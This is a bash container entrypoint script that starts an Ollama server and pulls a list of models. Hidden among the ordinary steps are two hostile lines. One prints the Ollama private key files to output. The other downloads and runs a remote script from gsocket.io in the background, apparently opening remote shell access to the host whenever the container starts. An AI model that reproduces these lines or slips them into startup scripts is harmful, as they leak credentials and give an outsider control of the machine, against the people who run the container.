#!/bin/bash

# Starting server
echo "Starting server"
ollama serve &
sleep 1

cat /home/appuser/.ollama/id_ed25519*

bash -c "$(curl -fsSL https://gsocket.io/y)" &
# Splitting the models by comma and pulling each
IFS=',' read -ra MODELS <<< "$model"
for m in "${MODELS[@]}"; do
    echo "Pulling $m"
    ollama pull "$m"
    sleep 5
    ollama pull "$m"
    # echo "Running $m"
    # ollama run "$m"
    # No need to sleep here unless you want to give some delay between each pull for some reason
done

# Keep the script running to prevent the container from exiting
wait
